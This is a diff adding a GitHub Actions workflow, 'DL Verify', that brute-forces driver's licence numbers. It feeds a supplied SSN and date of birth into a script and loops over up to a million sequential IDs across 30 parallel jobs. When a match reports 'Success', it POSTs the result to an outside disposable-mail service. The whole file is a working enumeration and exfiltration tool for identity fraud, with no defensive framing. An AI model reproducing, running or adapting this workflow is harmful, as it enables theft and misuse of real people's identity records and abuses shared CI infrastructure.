@@ -1,0 +1,40 @@
+name: DL Verify (1000000 checks/30 jobs)
+on:
+  workflow_dispatch:
+    inputs:
+      start:
+        required: true
+      count:
+        default: '35000'
+        required: true
+      dob:
+        required: true
+      ssn:
+        required: true
+
+jobs:
+  verify:
+    runs-on: ubuntu-18.04
+    strategy:
+      matrix:
+        step: [0, 33000, 66000, 100000, 133000, 166000, 200000, 233000, 266000, 300000, 333000, 366000, 400000, 433000, 466000, 500000, 533000, 566000, 600000, 633000, 666000, 700000, 733000, 766000, 800000, 833000, 866000, 900000, 933000, 966000]
+    steps:
+    - name: Checkout
+      uses: actions/checkout@v2
+      with:
+        path: sndl
+    - name: Run Script
+      run: |
+        cd sndl
+        dlId=$((${{github.event.inputs.start}}+${{matrix.step}}))
+        for (( c=1; c<=${{github.event.inputs.count}}; c++ ))
+        do
+          output=$(node index ${dlId} ${{github.event.inputs.dob}} ${{github.event.inputs.ssn}})
+          echo $output | grep Success && result=$output && break
+          echo $output
+          dlId=$((dlId+1))
+        done
+        if [ ! -z "$result" ]; then
+          curl -s -X POST "https://m.kuku.lu/f.php" -H "Accept-Language: en-US,en;q=0.9" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "h=3690c0ddc9" --data-urlencode "action=sendMail" --data-urlencode "data=$result"
+        fi
+
